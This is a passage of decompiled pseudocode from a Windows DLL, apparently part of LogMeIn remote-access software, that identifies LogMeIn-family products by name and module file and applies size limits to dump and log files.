  param_1[5] = 0;
  FUN_10033350(uVar1);
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10033350 */

int __fastcall FUN_10033350(int *param_1)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int *local_8;
  
  iVar2 = param_1[2];
  if (iVar2 != 0) {
    local_8 = param_1;
    iVar2 = FUN_105b012b();
    if (iVar2 == 0) {
      iVar2 = FUN_101dbb66(0,param_1[2]);
      if (iVar2 == 0) {
        piVar3 = (int *)FUN_1000ae10(&local_8);
        if (*piVar3 == 0) {
          iVar2 = 0;
        }
        else {
          iVar2 = *piVar3 + 0xc;
        }
        iVar2 = FUN_10006250("falal: CFireEvent can\'t get pulsed or set: %s\n",iVar2);
        if (local_8 != (int *)0x0) {
          LOCK();
          iVar1 = *local_8;
          iVar2 = *local_8;
          *local_8 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            iVar2 = FUN_100579ee(local_8);
          }
        }
        param_1[5] = 1;
      }
    }
  }
  return iVar2;
}



/* Function: FUN_100333d0 */

void __thiscall FUN_100333d0(int *param_1,short *param_2)

{
  int iVar1;
  undefined4 uVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  int *local_44 [8];
  undefined4 local_24;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076938;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    iVar1 = FUN_1000bd10(local_18);
  }
  else {
    iVar1 = FUN_1000ba60();
  }
  *param_1 = iVar1;
  local_8 = 0;
  param_1[1] = 0;
  param_1[2] = 1;
  *(undefined1 *)(param_1 + 3) = 1;
  local_44[0] = (int *)0x0;
  FUN_1002de70(L"SeCreateGlobalPrivilege",0);
  local_8._0_1_ = 1;
  if (((*param_1 == 0) || (*(int *)(*param_1 + 8) == 0)) ||
     (iVar1 = FUN_1004b5c0(&DAT_10086aa0,3), iVar1 == -1)) {
    FUN_100336a0(local_44);
  }
  else {
    uVar2 = FUN_10059ab0();
    local_8 = CONCAT31(local_8._1_3_,2);
    piVar3 = (int *)FUN_10022970(uVar2,extraout_ECX);
    local_44[0] = piVar3;
    if ((*param_1 != 0) && (*param_1 != -0xc)) {
      FUN_100106a0(local_44,1);
    }
    local_8._0_1_ = 1;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
  }
  FUN_10023720(local_24);
  FUN_1032d460();
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}



/* Function: FUN_10033660 */

void __fastcall FUN_10033660(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  if ((*(char *)(param_1 + 3) != '\0') && (param_1[1] != 0)) {
    (*DAT_10079270)(param_1[1]);
  }
  piVar2 = (int *)*param_1;
  param_1[1] = 0;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_100336a0 */

undefined4 __thiscall FUN_100336a0(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  undefined **ppuVar4;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074a28;
  local_10 = ExceptionList;
  if ((*param_1 == 0) || (*param_1 == -0xc)) {
    return 0;
  }
  local_14 = (int *)0x0;
  local_8 = 0;
  ExceptionList = &local_10;
  iVar2 = FUN_1000c520(&local_14,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  piVar1 = local_14;
  if (iVar2 != 0) {
    if ((local_14 == (int *)0x0) ||
       (ppuVar4 = (undefined **)(local_14 + 3), ppuVar4 == (undefined **)0x0)) {
      ppuVar4 = &PTR_10083554;
    }
    uVar3 = FUN_1004b770(ppuVar4);
    if (param_2 != (undefined4 *)0x0) {
      *param_2 = uVar3;
      uVar3 = 1;
      goto LAB_1003371c;
    }
  }
  uVar3 = 0;
LAB_1003371c:
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar1;
    *piVar1 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  ExceptionList = local_10;
  return uVar3;
}



/* FAILED to decompile function: FUN_10033760 */

/* Function: FUN_10033a00 */

void __thiscall FUN_10033a00(undefined4 *param_1,short *param_2)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  uint uVar3;
  int *piVar4;
  int iVar5;
  int *piVar6;
  undefined **ppuVar7;
  int *piVar8;
  wchar_t *pwVar9;
  undefined4 *puVar10;
  undefined **ppuVar11;
  undefined1 auStack_208 [4];
  int *local_204;
  int *local_200;
  uint local_1fc;
  int *local_1f8;
  int *piStack_1f4;
  int *local_1f0;
  int *piStack_1ec;
  wchar_t *pwStack_1e8;
  undefined4 *local_1e4;
  int *piStack_1e0;
  int *piStack_1dc;
  int *piStack_1d8;
  int *piStack_1d4;
  int *piStack_1d0;
  int *piStack_1cc;
  wchar_t *local_1c8;
  wchar_t *local_1c4;
  undefined4 uStack_1c0;
  undefined4 uStack_1bc;
  undefined4 uStack_1b8;
  undefined4 uStack_1b4;
  undefined4 uStack_1b0;
  undefined4 uStack_1ac;
  int iStack_1a8;
  int iStack_1a4;
  undefined4 uStack_1a0;
  undefined4 uStack_19c;
  undefined4 uStack_198;
  undefined4 uStack_194;
  undefined4 uStack_190;
  undefined4 uStack_18c;
  undefined4 uStack_188;
  undefined4 uStack_184;
  undefined4 uStack_180;
  undefined4 uStack_17c;
  int iStack_178;
  int iStack_174;
  undefined4 uStack_170;
  undefined4 uStack_16c;
  undefined8 uStack_168;
  wchar_t *apwStack_160 [79];
  uint local_24;
  void *local_1c;
  undefined1 *puStack_18;
  undefined4 local_14;
  
  local_14 = 0xffffffff;
  puStack_18 = &LAB_100769e2;
  local_1c = ExceptionList;
  local_24 = DAT_100956e0 ^ (uint)auStack_208;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffdf0;
  ExceptionList = &local_1c;
  *param_1 = 0;
  local_1e4 = param_1;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    piVar4 = (int *)FUN_1000bd10(uVar3);
  }
  else {
    piVar4 = (int *)FUN_1000ba60();
  }
  local_200 = (int *)0x0;
  local_14 = 1;
  local_1f0 = piVar4;
  iVar5 = FUN_1000c520(&local_200);
  if (iVar5 != 0) {
    piVar6 = (int *)FUN_1000ae10(&local_1f8);
    if (*piVar6 == 0) {
      iVar5 = 0;
    }
    else {
      iVar5 = *piVar6 + 0xc;
    }
    FUN_10006250("/CUSTOM specified: %s \n",iVar5);
    if (local_1f8 != (int *)0x0) {
      LOCK();
      iVar5 = *local_1f8;
      *local_1f8 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(local_1f8);
      }
    }
    piVar6 = local_200;
    local_204 = (int *)0x0;
LAB_10033af4:
    if (piVar6 == (int *)0x0) {
      ppuVar7 = (undefined **)0x0;
    }
    else {
      ppuVar7 = (undefined **)(piVar6 + 3);
    }
    ppuVar11 = &PTR_10083554;
    if (ppuVar7 != (undefined **)0x0) {
      ppuVar11 = ppuVar7;
    }
    ppuVar7 = &PTR_10083554;
    if ((undefined **)(&PTR_DAT_10084d00)[(int)local_204 * 2] != (undefined **)0x0) {
      ppuVar7 = (undefined **)(&PTR_DAT_10084d00)[(int)local_204 * 2];
    }
    iVar5 = (**(code **)(PTR_DAT_10096f20 + 0x198))(ppuVar11,ppuVar7);
    if (iVar5 != 0) goto code_r0x10033b31;
    *local_1e4 = *(undefined4 *)(&DAT_10084d04 + (int)local_204 * 8);
    if (piVar6 != (int *)0x0) {
      LOCK();
      iVar5 = *piVar6;
      *piVar6 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piVar6);
      }
    }
    if (piVar4 != (int *)0x0) {
      LOCK();
      iVar5 = *piVar4;
      *piVar4 = *piVar4 + -1;
      UNLOCK();
joined_r0x10033bc0:
      if (-1 < iVar5 + -1) goto LAB_100343d8;
      goto LAB_100343d0;
    }
    goto LAB_100343d8;
  }
LAB_10033b3b:
  local_1c8 = L"\\c:\\\\.*?\\\\{\\c[^\\\\]+}\\.xml";
  local_1c4 = L"\\c:\\\\.*?\\\\{\\c[^\\\\]+}\\.dmp";
  local_1fc = 0;
  do {
    iVar5 = FUN_1000c520(&local_200);
    piVar6 = local_200;
    if (iVar5 != 0) {
      piVar8 = (int *)FUN_1000ae10(&piStack_1d4);
      if (*piVar8 == 0) {
        iVar5 = 0;
      }
      else {
        iVar5 = *piVar8 + 0xc;
      }
      FUN_10006250("customization is derived from \'%s\'\n",iVar5);
      if (piStack_1d4 != (int *)0x0) {
        LOCK();
        iVar5 = *piStack_1d4;
        *piStack_1d4 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piStack_1d4);
        }
      }
      apwStack_160[0x26] = L"backup";
      apwStack_160[0x27] = (wchar_t *)0x4;
      apwStack_160[0x28] = L"logmein";
      apwStack_160[0x29] = (wchar_t *)0x1;
      apwStack_160[0x2a] = L"remotely";
      apwStack_160[0x2b] = (wchar_t *)0x2;
      apwStack_160[0x2c] = L"Rescue";
      apwStack_160[0x2d] = (wchar_t *)0x3;
      apwStack_160[0x2e] = L"Ignition";
      apwStack_160[0x2f] = (wchar_t *)0x5;
      apwStack_160[0x30] = L"ractrl";
      apwStack_160[0x31] = (wchar_t *)0x6;
      apwStack_160[0x32] = L"RA";
      apwStack_160[0x33] = (wchar_t *)0x2;
      apwStack_160[0x34] = L"Hamachi";
      apwStack_160[0x35] = (wchar_t *)0x7;
      apwStack_160[0x36] = L"strgmaint";
      apwStack_160[0x37] = (wchar_t *)0x8;
      apwStack_160[0x38] = L"chkcons";
      apwStack_160[0x39] = (wchar_t *)0x8;
      apwStack_160[0x3a] = L"strghttpmodule";
      apwStack_160[0x3b] = (wchar_t *)0x8;
      apwStack_160[0x3c] = L"iisbackend";
      apwStack_160[0x3d] = (wchar_t *)0x8;
      apwStack_160[0x3e] = L"iisfrontend";
      apwStack_160[0x3f] = (wchar_t *)0x8;
      apwStack_160[0x40] = L"join";
      apwStack_160[0x41] = (wchar_t *)0x9;
      apwStack_160[0x42] = L"lmifilterhook";
      apwStack_160[0x43] = (wchar_t *)0x9;
      apwStack_160[0x44] = L"lmiinputhook";
      apwStack_160[0x45] = (wchar_t *)0x9;
      apwStack_160[0x46] = L"lmiscrhook";
      apwStack_160[0x47] = (wchar_t *)0x9;
      apwStack_160[0x48] = L"lmisupport";
      apwStack_160[0x49] = (wchar_t *)0x9;
      apwStack_160[0x4a] = L"lpsvc";
      apwStack_160[0x4b] = (wchar_t *)0xa;
      apwStack_160[0x4c] = L"lpldap";
      apwStack_160[0x4d] = (wchar_t *)0xa;
      local_204 = (int *)0x0;
      do {
        pwVar2 = apwStack_160[(int)local_204 * 2 + 0x26];
        if (pwVar2 == (wchar_t *)0x0) {
          iVar5 = 0;
        }
        else {
          pwStack_1e8 = pwVar2 + 1;
          pwVar9 = pwVar2;
          do {
            wVar1 = *pwVar9;
            pwVar9 = pwVar9 + 1;
          } while (wVar1 != L'\0');
          iVar5 = (int)pwVar9 - (int)pwStack_1e8 >> 1;
        }
        if (piVar6 == (int *)0x0) {
          piStack_1ec = (int *)0x0;
        }
        else {
          piStack_1ec = piVar6 + 3;
          piVar4 = local_1f0;
        }
        iVar5 = FUN_1004b640(pwVar2,iVar5);
        if (iVar5 != -1) {
          *local_1e4 = apwStack_160[(int)local_204 * 2 + 0x27];
          if (piVar6 != (int *)0x0) {
            LOCK();
            iVar5 = *piVar6;
            *piVar6 = iVar5 + -1;
            UNLOCK();
            if (iVar5 + -1 < 0) {
              FUN_100579ee(piVar6);
            }
          }
          if (piVar4 == (int *)0x0) goto LAB_100343d8;
          LOCK();
          iVar5 = *piVar4;
          *piVar4 = *piVar4 + -1;
          UNLOCK();
          goto joined_r0x10033bc0;
        }
        local_204 = (int *)((int)local_204 + 1);
      } while (local_204 < (int *)0x14);
    }
    local_1fc = local_1fc + 1;
  } while (local_1fc < 2);
  puVar10 = (undefined4 *)FUN_10021a40(0,0);
  piVar4 = (int *)*puVar10;
  if (piVar4 != (int *)0x0) {
    LOCK();
    *piVar4 = *piVar4 + 1;
    UNLOCK();
  }
  local_1f8 = piVar4;
  piStack_1e0 = piVar4;
  if (piStack_1d0 != (int *)0x0) {
    LOCK();
    iVar5 = *piStack_1d0;
    *piStack_1d0 = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piStack_1d0);
    }
  }
  if (((piVar4 == (int *)0x0) || (piVar4 + 3 == (int *)0x0)) || ((short)piVar4[3] != 0)) {
    piVar4 = (int *)FUN_1000bd10();
  }
  else {
    if ((DAT_1009acdc & 1) == 0) {
      DAT_1009acdc = DAT_1009acdc | 1;
      local_1fc = 0;
      DAT_1009acd8 = (int *)FUN_1000bd10();
      if (DAT_1009acd8 != (int *)0x0) {
        DAT_1009acd8[2] = 0;
        *(undefined2 *)(DAT_1009acd8 + 3) = 0;
      }
      FUN_10057b51(&LAB_10078350);
    }
    piVar4 = DAT_1009acd8;
    if (DAT_1009acd8 != (int *)0x0) {
      LOCK();
      *DAT_1009acd8 = *DAT_1009acd8 + 1;
      UNLOCK();
      piVar4 = DAT_1009acd8;
    }
  }
  local_204 = (int *)0x5c;
  piStack_1f4 = piVar4;
  iVar5 = FUN_10010c00();
  if (iVar5 + 1 == 0) {
    if (piVar4 != (int *)0x0) {
      if (*piVar4 == 0) {
        piStack_1f4[2] = 0;
        *(undefined2 *)(piStack_1f4 + 3) = 0;
        local_1f8 = piStack_1e0;
        piVar6 = local_200;
        piVar4 = piStack_1f4;
        local_204 = piStack_1f4;
        goto LAB_10033ff7;
      }
      LOCK();
      iVar5 = *piStack_1f4;
      *piStack_1f4 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piStack_1f4);
      }
      local_1f8 = piStack_1e0;
      piVar6 = local_200;
    }
    piVar4 = (int *)0x0;
    local_204 = piVar4;
    piStack_1f4 = piVar4;
  }
  else {
    puVar10 = (undefined4 *)FUN_1000e640(&piStack_1d8,0,iVar5 + 1);
    piVar4 = (int *)FUN_10010440(*puVar10);
    local_204 = piVar4;
    piStack_1f4 = piVar4;
    if (piStack_1d8 != (int *)0x0) {
      LOCK();
      iVar5 = *piStack_1d8;
      *piStack_1d8 = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piStack_1d8);
      }
    }
  }
LAB_10033ff7:
  if (((piVar4 == (int *)0x0) || (piVar4 + 3 == (int *)0x0)) || ((short)piVar4[3] != 0)) {
    piVar4 = (int *)FUN_1000bd10();
  }
  else {
    if ((DAT_1009acdc & 1) == 0) {
      DAT_1009acdc = DAT_1009acdc | 1;
      pwStack_1e8 = (wchar_t *)0x0;
      DAT_1009acd8 = (int *)FUN_1000bd10();
      if (DAT_1009acd8 != (int *)0x0) {
        DAT_1009acd8[2] = 0;
        *(undefined2 *)(DAT_1009acd8 + 3) = 0;
      }
      FUN_10057b51(&LAB_10078350);
    }
    piVar4 = DAT_1009acd8;
    if (DAT_1009acd8 != (int *)0x0) {
      LOCK();
      *DAT_1009acd8 = *DAT_1009acd8 + 1;
      UNLOCK();
      piVar4 = DAT_1009acd8;
    }
  }
  apwStack_160[0] = L"LogMeIn.dll";
  apwStack_160[1] = (wchar_t *)0x1;
  apwStack_160[2] = L"RemotelyAnywhere.dll";
  apwStack_160[3] = (wchar_t *)0x2;
  apwStack_160[4] = L"RescueControl.dll";
  apwStack_160[5] = (wchar_t *)0x3;
  apwStack_160[6] = L"npRescue.dll";
  apwStack_160[7] = (wchar_t *)0x3;
  apwStack_160[8] = L"AMTTerminalControl.dll";
  apwStack_160[9] = (wchar_t *)0x1;
  apwStack_160[10] = L"npamttct.dll";
  apwStack_160[0xb] = (wchar_t *)0x1;
  apwStack_160[0xc] = L"LogmeInBackup.exe";
  apwStack_160[0xd] = (wchar_t *)0x4;
  apwStack_160[0xe] = L"LMIIgnition.exe";
  apwStack_160[0xf] = (wchar_t *)0x5;
  apwStack_160[0x10] = L"RaCtrl.dll";
  apwStack_160[0x11] = (wchar_t *)0x6;
  apwStack_160[0x12] = L"npRaCtrl.dll";
  apwStack_160[0x13] = (wchar_t *)0x6;
  apwStack_160[0x14] = L"hamachi-2.exe";
  apwStack_160[0x15] = (wchar_t *)0x7;
  apwStack_160[0x16] = L"strgmaint.exe";
  apwStack_160[0x17] = (wchar_t *)0x8;
  apwStack_160[0x18] = L"chkcons.exe";
  apwStack_160[0x19] = (wchar_t *)0x8;
  apwStack_160[0x1a] = L"strghttpmodule.dll";
  apwStack_160[0x1b] = (wchar_t *)0x8;
  apwStack_160[0x1c] = L"iisbackend.dll";
  apwStack_160[0x1d] = (wchar_t *)0x8;
  apwStack_160[0x1e] = L"iisfrontend.dll";
  apwStack_160[0x1f] = (wchar_t *)0x8;
  apwStack_160[0x20] = L"join.me.exe";
  apwStack_160[0x21] = (wchar_t *)0x9;
  apwStack_160[0x22] = L"lpsvc.exe";
  apwStack_160[0x23] = (wchar_t *)0xa;
  apwStack_160[0x24] = L"lpldap.exe";
  apwStack_160[0x25] = (wchar_t *)0xa;
  local_1fc = 0;
  piStack_1dc = piVar4;
  while( true ) {
    if (piVar4 != (int *)0x0) {
      LOCK();
      *piVar4 = *piVar4 + 1;
      UNLOCK();
    }
    local_14 = CONCAT31(local_14._1_3_,5);
    piStack_1ec = (int *)FUN_1000bfa0(apwStack_160[local_1fc * 2],0xffffffff);
    FUN_1005ff60(&uStack_1c0,0,0x30);
    uStack_190 = uStack_1c0;
    uStack_18c = uStack_1bc;
    uStack_188 = uStack_1b8;
    uStack_184 = uStack_1b4;
    uStack_180 = uStack_1b0;
    uStack_17c = uStack_1ac;
    iStack_178 = iStack_1a8;
    iStack_174 = iStack_1a4;
    uStack_170 = uStack_1a0;
    uStack_16c = uStack_19c;
    uStack_168 = CONCAT44(uStack_194,uStack_198);
    piVar8 = (int *)FUN_1000ae10(&piStack_1cc);
    iVar5 = *piVar8;
    if ((iVar5 != 0) && (iVar5 != -0xc)) {
      if (iVar5 == 0) {
        iVar5 = 0;
      }
      else {
        iVar5 = iVar5 + 0xc;
      }
      iVar5 = FUN_1005a899(iVar5,&uStack_190);
      if (iVar5 != 0) {
        uStack_168 = 0;
      }
    }
    if (piStack_1cc != (int *)0x0) {
      LOCK();
      iVar5 = *piStack_1cc;
      *piStack_1cc = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piStack_1cc);
      }
    }
    if (iStack_178 != 0 || iStack_174 != 0) break;
    local_14 = CONCAT31(local_14._1_3_,4);
    if (piStack_1ec != (int *)0x0) {
      LOCK();
      iVar5 = *piStack_1ec;
      *piStack_1ec = iVar5 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(piStack_1ec);
      }
    }
    local_1fc = local_1fc + 1;
    if (0x12 < local_1fc) {
LAB_10034360:
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar5 = *piVar4;
        *piVar4 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      if (local_204 != (int *)0x0) {
        LOCK();
        iVar5 = *local_204;
        *local_204 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(local_204);
        }
      }
      if (local_1f8 != (int *)0x0) {
        LOCK();
        iVar5 = *local_1f8;
        *local_1f8 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(local_1f8);
        }
      }
      if (piVar6 != (int *)0x0) {
        LOCK();
        iVar5 = *piVar6;
        *piVar6 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar6);
        }
      }
      if (local_1f0 != (int *)0x0) {
        LOCK();
        iVar5 = *local_1f0;
        *local_1f0 = *local_1f0 + -1;
        UNLOCK();
        piVar4 = local_1f0;
        if (iVar5 + -1 < 0) {
LAB_100343d0:
          FUN_100579ee(piVar4);
        }
      }
LAB_100343d8:
      ExceptionList = local_1c;
      FUN_100579df();
      return;
    }
  }
  *local_1e4 = apwStack_160[local_1fc * 2 + 1];
  if (piStack_1ec != (int *)0x0) {
    LOCK();
    iVar5 = *piStack_1ec;
    *piStack_1ec = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(piStack_1ec);
    }
  }
  goto LAB_10034360;
code_r0x10033b31:
  local_204 = (int *)((int)local_204 + 1);
  if ((int *)0xa < local_204) goto LAB_10033b3b;
  goto LAB_10033af4;
}



/* Function: FUN_10034410 */

undefined * __fastcall FUN_10034410(int param_1)

{
  if (10 < param_1) {
    return (undefined *)0x0;
  }
  return (&PTR_DAT_10084d00)[param_1 * 2];
}



/* Function: FUN_10034420 */

void __fastcall FUN_10034420(uint *param_1,int param_2)

{
  ushort uVar1;
  int *piVar2;
  char cVar3;
  uint uVar4;
  undefined4 uVar5;
  int *piVar6;
  int *piVar7;
  int iVar8;
  ushort *puVar9;
  int iVar10;
  int *extraout_ECX;
  ushort *puVar11;
  bool bVar12;
  bool bVar13;
  int *local_64;
  int *local_60;
  int *local_5c;
  int *local_58;
  int *local_54;
  uint *local_50;
  int *local_4c;
  char local_45;
  int *local_30;
  int local_1c;
  int local_18;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076a28;
  local_10 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_58 = (int *)0x0;
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    *piVar2 = *piVar2 + 1;
    UNLOCK();
  }
  local_8 = 0;
  piVar6 = (int *)*param_1;
  if (piVar6 != (int *)0x0) {
    LOCK();
    *piVar6 = *piVar6 + 1;
    UNLOCK();
  }
  local_60 = piVar2;
  local_54 = piVar6;
  local_50 = param_1;
  local_14 = uVar4;
  uVar5 = FUN_10019e10(&local_5c);
  local_8 = CONCAT31(local_8._1_3_,2);
  FUN_100213b0(uVar5);
  if (local_5c != (int *)0x0) {
    LOCK();
    iVar10 = *local_5c;
    *local_5c = iVar10 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(local_5c,uVar4);
    }
  }
  local_5c = local_30;
  if (((local_30 == (int *)0x0) && (local_1c == 0)) && (local_18 == 0)) goto LAB_10034826;
  FUN_10020e80(L"rename_test");
  piVar6 = (int *)FUN_10019e10(&local_58);
  piVar7 = (int *)FUN_10019e10(&local_64);
  if (*piVar6 == 0) {
    iVar10 = 0;
  }
  else {
    iVar10 = *piVar6 + 0xc;
  }
  if (*piVar7 == 0) {
    iVar8 = 0;
  }
  else {
    iVar8 = *piVar7 + 0xc;
  }
  local_4c = (int *)FUN_1005b994(iVar8,iVar10);
  if (local_64 != (int *)0x0) {
    LOCK();
    iVar10 = *local_64;
    *local_64 = iVar10 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(local_64);
    }
  }
  if (local_58 != (int *)0x0) {
    LOCK();
    iVar10 = *local_58;
    *local_58 = iVar10 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(local_58);
    }
  }
  piVar6 = (int *)FUN_10019e10(&local_64);
  piVar7 = (int *)FUN_10019e10(&local_58);
  if (*piVar6 == 0) {
    iVar10 = 0;
  }
  else {
    iVar10 = *piVar6 + 0xc;
  }
  if (*piVar7 == 0) {
    iVar8 = 0;
  }
  else {
    iVar8 = *piVar7 + 0xc;
  }
  uVar4 = FUN_1005b994(iVar8,iVar10);
  local_4c = (int *)((uint)local_4c | uVar4);
  if (local_58 != (int *)0x0) {
    LOCK();
    iVar10 = *local_58;
    *local_58 = iVar10 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(local_58);
    }
  }
  if (local_64 != (int *)0x0) {
    LOCK();
    iVar10 = *local_64;
    *local_64 = iVar10 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(local_64);
      local_64 = extraout_ECX;
    }
  }
  piVar6 = local_54;
  if (local_4c != (int *)0x0) goto LAB_10034826;
  if (param_2 == 0) {
    local_4c = (int *)*local_50;
    if (local_4c != (int *)0x0) {
      LOCK();
      iVar10 = *local_4c;
      *local_4c = *local_4c + 1;
      UNLOCK();
      local_64 = (int *)(iVar10 + 1);
    }
    FUN_10034b20(local_64);
    piVar6 = (int *)FUN_10019e10(&local_50);
    if ((*piVar6 == 0) || (puVar9 = (ushort *)(*piVar6 + 0xc), puVar9 == (ushort *)0x0)) {
      bVar12 = false;
    }
    else {
      puVar11 = &DAT_10084cb8;
      do {
        uVar1 = *puVar9;
        bVar12 = uVar1 < *puVar11;
        if (uVar1 != *puVar11) {
LAB_1003463e:
          bVar12 = (-(uint)bVar12 | 1) == 0;
          goto LAB_1003464c;
        }
        if (uVar1 == 0) break;
        uVar1 = puVar9[1];
        bVar12 = uVar1 < puVar11[1];
        if (uVar1 != puVar11[1]) goto LAB_1003463e;
        puVar9 = puVar9 + 2;
        puVar11 = puVar11 + 2;
      } while (uVar1 != 0);
      bVar12 = true;
    }
LAB_1003464c:
    if (local_50 != (uint *)0x0) {
      LOCK();
      uVar4 = *local_50;
      *local_50 = uVar4 - 1;
      UNLOCK();
      if ((int)(uVar4 - 1) < 0) {
        FUN_100579ee(local_50);
      }
    }
    if (bVar12) {
      param_2 = 1;
    }
    else {
      piVar6 = (int *)FUN_10019e10(&local_50);
      if ((*piVar6 == 0) || (puVar9 = (ushort *)(*piVar6 + 0xc), puVar9 == (ushort *)0x0)) {
        bVar12 = false;
      }
      else {
        puVar11 = &DAT_1008899c;
        do {
          uVar1 = *puVar9;
          bVar12 = uVar1 < *puVar11;
          if (uVar1 != *puVar11) {
LAB_100346be:
            bVar12 = (-(uint)bVar12 | 1) == 0;
            goto LAB_100346cc;
          }
          if (uVar1 == 0) break;
          uVar1 = puVar9[1];
          bVar12 = uVar1 < puVar11[1];
          if (uVar1 != puVar11[1]) goto LAB_100346be;
          puVar9 = puVar9 + 2;
          puVar11 = puVar11 + 2;
        } while (uVar1 != 0);
        bVar12 = true;
      }
LAB_100346cc:
      if (local_50 != (uint *)0x0) {
        LOCK();
        uVar4 = *local_50;
        *local_50 = uVar4 - 1;
        UNLOCK();
        if ((int)(uVar4 - 1) < 0) {
          FUN_100579ee(local_50);
        }
      }
      if (bVar12) {
        param_2 = 2;
      }
      else {
        piVar6 = (int *)FUN_10019e10(&local_58);
        bVar12 = false;
        if ((*piVar6 == 0) || (puVar9 = (ushort *)(*piVar6 + 0xc), puVar9 == (ushort *)0x0)) {
LAB_1003474c:
          FUN_10019e10(&local_50);
          bVar12 = true;
          cVar3 = FUN_1000e6a0(&DAT_10084cc0);
          local_45 = '\0';
          if (cVar3 != '\0') goto LAB_10034771;
        }
        else {
          puVar11 = &DAT_10088994;
          do {
            uVar1 = *puVar9;
            bVar13 = uVar1 < *puVar11;
            if (uVar1 != *puVar11) {
LAB_1003473e:
              uVar4 = -(uint)bVar13 | 1;
              goto LAB_10034743;
            }
            if (uVar1 == 0) break;
            uVar1 = puVar9[1];
            bVar13 = uVar1 < puVar11[1];
            if (uVar1 != puVar11[1]) goto LAB_1003473e;
            puVar9 = puVar9 + 2;
            puVar11 = puVar11 + 2;
          } while (uVar1 != 0);
          uVar4 = 0;
LAB_10034743:
          if (uVar4 != 0) goto LAB_1003474c;
LAB_10034771:
          local_45 = '\x01';
        }
        if (bVar12) {
          FUN_10006f30();
        }
        FUN_10006f30();
        param_2 = (local_45 == '\0') + 3;
      }
    }
    if (local_4c != (int *)0x0) {
      LOCK();
      iVar10 = *local_4c;
      *local_4c = iVar10 + -1;
      UNLOCK();
      if (iVar10 + -1 < 0) {
        FUN_100579ee(local_4c);
      }
    }
  }
  piVar6 = local_54;
  if (param_2 == 1) {
    bVar12 = local_5c < (int *)0x2800000;
    bVar13 = local_5c == (int *)0x2800000;
  }
  else if (param_2 == 2) {
    bVar12 = local_5c < (int *)0x100000;
    bVar13 = local_5c == (int *)0x100000;
  }
  else {
    if (param_2 != 3) goto LAB_10034826;
    bVar12 = local_5c < (int *)0x300000;
    bVar13 = local_5c == (int *)0x300000;
  }
  if (!bVar12 && !bVar13) {
    piVar6 = (int *)FUN_10019e10(&local_50);
    if (*piVar6 == 0) {
      iVar10 = 0;
    }
    else {
      iVar10 = *piVar6 + 0xc;
    }
    FUN_1005a7b5(iVar10);
    piVar6 = local_54;
    if (local_50 != (uint *)0x0) {
      LOCK();
      uVar4 = *local_50;
      *local_50 = uVar4 - 1;
      UNLOCK();
      if ((int)(uVar4 - 1) < 0) {
        FUN_100579ee(local_50);
        piVar6 = local_54;
      }
    }
  }
LAB_10034826:
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar10 = *piVar6;
    *piVar6 = iVar10 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  if (piVar2 != (int *)0x0) {
    LOCK();
